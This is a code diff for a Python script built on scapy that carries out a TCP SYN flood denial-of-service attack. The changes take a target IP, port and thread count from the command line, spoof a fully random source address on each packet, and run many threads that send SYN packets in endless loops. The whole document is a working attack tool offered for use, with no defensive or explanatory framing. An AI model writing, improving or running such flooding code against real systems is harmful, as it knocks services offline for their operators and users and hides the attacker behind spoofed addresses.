@@ -1,37 +1,64 @@
 # coding: utf-8
-import random
+import random, sys, threading
 from scapy.all import *
 
 def takeInput():
     global PORT
     try:
-        PORT = int(input("Port: "))
+        PORT = int(sys.argv[2])
     except ValueError:
-        print("Please specify an Integer")
-        takeInput()
+        print("Please specify a valid port number")
+        exit()
     takeInput2()
 
 def takeInput2():
     global SERVER
-    SERVER = input("Server: ")
+    SERVER = str(sys.argv[1])
     if len(SERVER.split(".")) != 4:
         print("Invalid IPv4 address (note: IPv6 is not allowed)")
-        takeInput2()
+        exit()
+    takeInput3()
 
-def syn_flood(server_ip, server_port):
-    src_port = RandShort()
+def takeInput3():
+    global threads
+    try:
+        threads = int(sys.argv[3])
+    except ValueError:
+        print("Invalid thread number")
+        exit()
 
-    ip_layer = IP(src=RandIP("192.168.1.1/24"), dst=server_ip)
-    tcp_layer = TCP(sport=RandShort(), dport=server_port, flags="S")
-    raw_layer = Raw(b"X"*1024)
+def randomIP():
+	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+	return ip
 
-    syn_packet = ip_layer / tcp_layer / raw_layer
+def randInt():
+	x = random.randint(1000,1500)
+	return x	
 
-    send(syn_packet, loop=1, verbose=0)
+def syn_flood(dstIP,dstPort):
+    while True:
+        s_port = randInt()
+        IP_Packet = IP ()
+        IP_Packet.src = randomIP()
+        IP_Packet.dst = dstIP
+        TCP_Packet = TCP ()	
+        TCP_Packet.sport = s_port
+        TCP_Packet.dport = dstPort
+        TCP_Packet.flags = "S"
+        send(IP_Packet/TCP_Packet, verbose=0)
 
 def main():
+    if len(sys.argv) < 3:
+        print("usage: %s [ip] [port] [number of threads]"%sys.argv[0])
+        exit()
     takeInput()
-    syn_flood(SERVER, PORT)
+    print("Sending Syn Packets... (Ctrl + C to exit)")
+    for i in range(threads):
+        syn_thread = threading.Thread(target=syn_flood, args=(SERVER, PORT), daemon=True)
+        syn_thread.start()
+    
+    while True:
+        pass
 
 if __name__ == '__main__':
     main()
